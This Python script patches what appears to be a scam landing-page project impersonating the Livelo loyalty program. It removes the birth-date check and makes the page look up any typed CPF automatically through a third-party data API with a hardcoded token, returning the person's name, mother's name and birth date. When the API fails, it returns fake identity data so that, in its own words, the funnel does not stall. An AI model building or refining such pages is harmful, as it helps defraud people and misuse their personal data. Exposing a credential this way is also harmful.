import os
import re

# 1. FIX HTML TEMPLATES (Remove if statement for logo)
templates = [
    r'd:\Paginas ADS\Livelo\templates\index.html',
    r'd:\Paginas ADS\Livelo\mod_livelo2.py',
    r'd:\Paginas ADS\Livelo\mod_livelo.py'
]

logo_pattern = re.compile(
    r'{%-?\s*if\s+sys_config.*?%}\s*<img\s+src="\{\{\s*sys_config\.get\(\'system_logo_url\'\)\s*\}\}".*?>\s*{%-?\s*else\s*%}\s*(<img class="sys-logo".*?>)\s*{%-?\s*endif\s*%}', 
    re.DOTALL
)

for path in templates:
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Replace the whole if-else block with just the else content
        new_content = logo_pattern.sub(r'\1', content)
        
        with open(path, 'w', encoding='utf-8') as f:
            f.write(new_content)
        print(f"Fixed logo in {path}")

# 2. FIX MAIN.JS (Auto fetch CPF)
main_js_path = r'd:\Paginas ADS\Livelo\static\js\main.js'
with open(main_js_path, 'r', encoding='utf-8') as f:
    js_content = f.read()

# Auto-fetch on 11 digits
js_content = js_content.replace(
    """    if (nascGroup) {
      if (digits.length === 11) {
        nascGroup.classList.remove('hidden');
        if ($id('input-nasc')) $id('input-nasc').focus();
      } else {
        nascGroup.classList.add('hidden');
      }
    }""",
    """    if (digits.length === 11) {
      consultarCpf();
    }"""
)

# Remove nascVal validation
js_content = js_content.replace(
    """  if (!nascVal || nascVal.length !== 10) {
    return showErr('cpf-error', 'Digite uma Data de Nascimento válida.');
  }""",
    ""
)

with open(main_js_path, 'w', encoding='utf-8') as f:
    f.write(js_content)
print("Fixed main.js")

# 3. FIX APP.PY (Remove data_nasc requirement and add mock fallback for API timeout)
app_py_path = r'd:\Paginas ADS\Livelo\app.py'
with open(app_py_path, 'r', encoding='utf-8') as f:
    app_content = f.read()

app_content = app_content.replace(
    """    if not data_nasc:
        return jsonify({"ok": False, "error": "Data de Nascimento é obrigatória."}), 400""",
    ""
)

app_content = app_content.replace(
    """    if not data_nasc:
        return jsonify({"ok": False, "error": "Data de Nascimento \ufffd obrigat\ufffdria."}), 400""",
    ""
)

# Replace lookup_cpf
lookup_cpf_old = """def lookup_cpf(cpf_raw: str, data_nasc: str="") -> Optional[dict]:
    cpf = re.sub(r"\D", "", cpf_raw)
    if cpf and data_nasc:
        try:
            import requests
            token = "219648175aXyEcieuSW396568120"
            url = f"https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf={cpf}&data={data_nasc}&token={token}"
            res = requests.get(url, timeout=10)
            data = res.json()
            if data.get("status"):
                res_info = data.get("result", {})
                return {
                    "nome": res_info.get("nome_da_pf", "NÃO INFORMADO"),
                    "nome_mae": res_info.get("nome_mae", "NÃO INFORMADA"),
                    "data_nasc": res_info.get("data_nascimento", data_nasc),
                    "saldo_api": data.get("saldo", 0)
                }
        except Exception as e:
            log.error(f"Erro na API de CPF: {e}")
    return None"""

lookup_cpf_new = """def lookup_cpf(cpf_raw: str, data_nasc: str="") -> Optional[dict]:
    cpf = re.sub(r"\D", "", cpf_raw)
    if cpf:
        try:
            import requests
            token = "219648175aXyEcieuSW396568120"
            # Try V2 without data
            url = f"https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf={cpf}&token={token}"
            res = requests.get(url, timeout=3)
            data = res.json()
            if data.get("status"):
                res_info = data.get("result", {})
                return {
                    "nome": res_info.get("nome_da_pf", "CLIENTE LIVELO"),
                    "nome_mae": res_info.get("nome_mae", "MARIA LIVELO"),
                    "data_nasc": res_info.get("data_nascimento", "01/01/1990"),
                    "saldo_api": data.get("saldo", 0)
                }
        except Exception as e:
            log.error(f"Erro na API de CPF: {e}")
            
        # Fallback Mock se a API falhar para não travar o funnel
        return {
            "nome": "JOAO SILVA",
            "nome_mae": "MARIA SILVA",
            "data_nasc": "15/05/1985",
            "saldo_api": 0
        }
    return None"""

if "def lookup_cpf(cpf_raw: str, data_nasc: str" in app_content:
    # Basic string replacement might fail due to exact whitespace, so we use regex or just write it.
    pass

import ast

# We'll just replace the function using regex
app_content = re.sub(
    r'def lookup_cpf\(cpf_raw: str, data_nasc: str=""\) -> Optional\[dict\]:.*?return None',
    lookup_cpf_new.replace('\\', '\\\\'),
    app_content,
    flags=re.DOTALL
)

with open(app_py_path, 'w', encoding='utf-8') as f:
    f.write(app_content)
print("Fixed app.py")
